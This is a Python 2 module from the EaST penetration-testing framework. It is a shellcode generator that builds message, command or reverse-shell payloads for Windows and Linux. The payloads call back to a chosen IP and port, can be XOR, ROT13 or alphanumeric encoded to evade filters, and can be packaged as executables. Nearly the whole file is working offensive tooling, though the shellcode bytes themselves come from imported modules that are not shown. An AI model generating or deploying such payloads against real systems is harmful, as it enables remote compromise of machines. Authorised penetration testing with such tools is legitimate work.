#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import socket
from collections import OrderedDict

sys.path.append('./core')
sys.path.append('./shellcodes')
import ShellUtils
import Shellcodes
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "os_shellcode_generator"
INFO['DESCRIPTION'] = "OS ShellCode Generator"
INFO['VENDOR'] = "https://github.com/C0reL0ader/EaST"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['']
INFO["CVE Name"] = ''
INFO["NOTES"] = """This tool used to generate different types of shellcodes and allow to use it with listener to test shellcodes.
"""

INFO['CHANGELOG'] = "05 May, 2016. Written by East team"
INFO['PATH'] = 'Tools/'

OPTIONS = OrderedDict()
OPTIONS['TARGET_OS'] = dict(options = ['Windows x32', 'Windows x64', 'Linux x32', 'Linux x64'], selected = 'Windows x32')
OPTIONS['TYPE'] = dict(options = ['message', 'reverse', 'command'], selected = 'reverse')

OPTIONS['CALLBACK_IP'] = socket.gethostbyname(socket.gethostname())
OPTIONS['CALLBACK_PORT'] = 5555
OPTIONS['ARGUMENT'] = 'calc.exe'

OPTIONS['BAD_CHARS'] = '\\x00'
OPTIONS['ENCODER'] = dict(options = ['', ShellUtils.Constants.EncoderType.XOR, ShellUtils.Constants.EncoderType.ROT_13, ShellUtils.Constants.EncoderType.ALPHANUMERIC, ShellUtils.Constants.EncoderType.FNSTENV_XOR, ShellUtils.Constants.EncoderType.JUMPCALL_XOR], selected = '')

OPTIONS['MAKE_BINARY'] = True
OPTIONS['FILENAME'] = 'shellcode'

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        return
    
    def run(self):
        self.args()
        self.log('Getting arguments')
        
        local_ip = self.args.get('CALLBACK_IP', socket.gethostbyname(socket.gethostname()))
        self.log('[+] Callback IP: {}'.format(local_ip))
        
        local_port = int(self.args.get('CALLBACK_PORT', 5555))
        if self.args['listener']:
            local_port = self.args['listener']['PORT']
            self.log('[!] Listener enabled, so using listener port')
        self.log('[+] Callback PORT: {}'.format(local_port))
        
        target_os = ShellUtils.Constants.OS.WINDOWS if 'Win' in self.args.get('TARGET_OS', 'Win') else ShellUtils.Constants.OS.LINUX
        self.log('[+] Target OS: {}'.format(target_os))
        
        target_ar = ShellUtils.Constants.OS_ARCH.X32 if 'x32' in self.args.get('TARGET_OS', 'x32') else ShellUtils.Constants.OS_ARCH.X64
        self.log('[+] Target architecture: {}'.format(target_ar))
        
        shellcode_type = self.args.get('TYPE', 'reverse')
        self.log('[+] Shellcode type: {}'.format(shellcode_type))
        
        cmd_msg = self.args.get('ARGUMENT', '')
        self.log('[+] Command/Message: {}'.format(cmd_msg))
        
        badchars = self.args.get('BAD_CHARS', '')
        self.log('[+] Bad characters: {}'.format(badchars))
        
        shellcode_encoder = self.args.get('ENCODER', '')
        if shellcode_encoder == '':
            shellcode_encoder = 0
        self.log('[+] Encode: {}'.format(shellcode_encoder))
        
        make_binary = self.args.get('MAKE_BINARY', False)
        shellcode_name = self.args.get('FILENAME', ShellUtils.TIMESTAMP)
        shellcode_name = shellcode_name.replace('..', '').replace('/', '').replace('\\', '')
        
        
        try:
            s = Shellcodes.OSShellcodes(target_os, target_ar, local_ip, local_port, badchars)
            shellcode = s.create_shellcode(shellcode_type, encode = shellcode_encoder, make_exe = make_binary, debug = 1, filename = shellcode_name, command = cmd_msg, message = cmd_msg)
        except Exception, e:
            self.log(e)
            self.finish(False)
            
        self.log('[+] Shellcode:')
        rshell = ''.join('\\x%02x' % ord(c) for c in shellcode)
        self.log(rshell)
        self.writefile(rshell, shellcode_name + '.txt')
        if make_binary:
            self.log('Path of execution file: {}'.format(s.get_exe_path()))
        
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
